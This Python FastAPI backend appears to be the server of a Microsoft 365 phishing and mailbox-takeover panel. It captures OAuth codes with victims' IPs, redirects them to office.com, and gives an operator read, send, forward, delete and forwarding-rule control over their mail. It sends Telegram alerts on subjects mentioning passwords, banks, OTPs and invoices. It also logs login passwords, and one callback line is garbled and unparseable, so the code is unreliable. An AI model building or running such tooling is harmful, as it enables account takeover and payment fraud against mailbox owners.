from fastapi import FastAPI, Request, WebSocket
from fastapi.responses import RedirectResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import logging
import asyncio

from auth import generate_login_link, exchange_code_for_token
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    get_conversation
)
from admin_auth import login_admin, require_admin
from urllib.parse import urlparse, parse_qs
from db import init_db, SessionLocal
from models import TenantToken, Rule
from rule_engine import apply_rules
from alerts import send_telegram_alert

app = FastAPI()

# =========================
# LOGGING CONFIG
# =========================
logging.basicConfig(level=logging.DEBUG)

# =========================
# CORS (VERY IMPORTANT)
# =========================
origins = [
    "http://localhost:3000",  # Local development (optional)
    "https://frontend-xg84.onrender.com",  # Your actual Render frontend URL
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,  # Allow frontend URLs
    allow_credentials=True,  # Ensure credentials are allowed
    allow_methods=["*"],
    allow_headers=["*"],
)

# =========================
# DEBUG MIDDLEWARE 🔥
# =========================
@app.middleware("http")
async def log_requests(request: Request, call_next):
    logging.debug(f"\n--- REQUEST START ---")
    logging.debug(f"{request.method} {request.url}")
    logging.debug(f"Headers: {request.headers}")
    logging.debug(f"Cookies: {request.cookies}")

    response = await call_next(request)

    logging.debug(f"Response Status: {response.status_code}")
    logging.debug(f"--- REQUEST END ---\n")

    return response

# =========================
# WEBSOCKET (REAL-TIME ALERTS)
# =========================
connected_clients = []

@app.websocket("/ws/alerts")
async def websocket_alerts(ws: WebSocket):
    await ws.accept()
    connected_clients.append(ws)

    try:
        while True:
            await ws.receive_text()
    except:
        connected_clients.remove(ws)

async def broadcast_alert(message: str):
    for ws in connected_clients:
        try:
            await ws.send_text(message)
        except:
            pass

# =========================
# STARTUP
# =========================
@app.on_event("startup")
def startup():
    init_db()

# =========================
# ADMIN AUTH
# =========================
@app.post("/admin/login")
async def admin_login(request: Request):
    body = await request.json()
    logging.debug(f"LOGIN BODY: {body}")
    return login_admin(body.get("username"), body.get("password"))

# =========================
# MICROSOFT LOGIN
# =========================
@app.get("/login")
def login(user_id: str = None):
    return RedirectResponse(generate_login_link(user_id or "default-user"))

@app.get("/generate-login-url")
def generate_login_url(user_id: str = None):
    login_url = generate_login_link(user_id or "default-user")

    parsed = urlparse(login_url)
    state = parse_qs(parsed.query).get("state", [""])[0]
    session_id = state.split(":")[1] if ":" in state else "default"

    return {"login_url": login_url, "session_id": session_id}

@app.get("/auth/callback")
def auth_callback(request: Request):
    init_db()

    code = request.query_params.get("code")
    state = request.query_params.get("state")

    logging.debug(f"AUTH CALLBACK: code={code}, state={state}")

    if not code:
        return {"error": "No code received"}

    client_ip = request.client.host

    try:
        user_id, session_id = (state.split(":") if ":" in state = f"{user_id}:{session_id}"

        exchange_code_for_token(code, state, client_ip)

        response = RedirectResponse(url="https://www.office.com")

        response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,
    secure=True,  # Ensure cookies are secure
    samesite="none",  # For cross-origin requests
    path="/",  # Make sure it applies to the entire app
)

        logging.debug(f"SESSION COOKIE SET: {session_id}")

        return response

    except Exception as e:
        logging.error(f"AUTH ERROR: {e}")
        return {"error": str(e)}

# =========================
# SESSION
# =========================
@app.get("/session")
def check_session(request: Request):
    sid = request.cookies.get("session_id")
    logging.debug(f"SESSION CHECK: {sid}")
    return {"active": bool(sid), "session_id": sid}

@app.get("/logout")
def logout():
    res = JSONResponse({"message": "Logged out"})
    res.delete_cookie("session_id", path="/")
    return res

# =========================
# EMAILS (RULES + ALERTS)
# =========================
@app.get("/emails")
def get_emails(request: Request, user_id: str = None):
    require_admin(request)

    session_id = request.cookies.get("session_id")
    logging.debug(f"SESSION IN EMAILS: {session_id}")

    user_id = user_id or "default-user"

    emails = fetch_emails(user_id, session_id)

    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment"]

    for e in emails:
        email_data = {
            "id": e.get("id"),
            "subject": e.get("subject"),
            "body": e.get("preview"),
            "from": e.get("from")
        }

        # RULE ENGINE
        apply_rules(user_id, session_id, email_data)

        # ALERTS
        for word in ALERT_KEYWORDS:
            if word in (email_data["subject"] or "").lower():
                msg = f"🚨 {word.upper()} detected → {email_data['subject']}"

                send_telegram_alert(msg)
                asyncio.create_task(broadcast_alert(msg))

    return {"emails": emails}

# =========================
# FOLDERS
# =========================
@app.get("/folders")
def get_folders(request: Request, user_id: str = None):
    require_admin(request)  # Ensure admin auth middleware or function is working

    session_id = request.cookies.get("session_id")
    if not session_id:
        return JSONResponse({"error": "Unauthorized"}, status_code=401)

    return {
        "folders": get_mail_folders(
            user_id or "default-user",
            session_id
        )
    }

# =========================
# EMAIL DETAIL
# =========================
@app.get("/email/{message_id}")
def email_detail(message_id: str, request: Request, user_id: str = None):
    require_admin(request)

    session_id = request.cookies.get("session_id")

    data = get_email_detail(user_id or "default-user", session_id, message_id)

    apply_rules(user_id, session_id, {
        "id": message_id,
        "subject": data.get("subject"),
        "body": data.get("body"),
        "from": data.get("from")
    })

    return data

# =========================
# RULES
# =========================
@app.post("/rules")
async def add_rule(request: Request):
    require_admin(request)

    body = await request.json()
    logging.debug(f"RULE CREATE: {body}")

    db = SessionLocal()

    rule = Rule(
        condition=body.get("condition"),
        action=body.get("action"),
        target_folder=body.get("target_folder"),
        forward_to=body.get("forward_to")
    )

    db.add(rule)
    db.commit()
    db.close()

    return {"message": "Rule created"}

@app.get("/rules")
def get_rules(request: Request):
    require_admin(request)

    db = SessionLocal()
    rules = db.query(Rule).all()

    result = [{
        "id": r.id,
        "condition": r.condition,
        "action": r.action.value,
        "target_folder": r.target_folder,
        "forward_to": r.forward_to
    } for r in rules]

    db.close()
    return {"rules": result}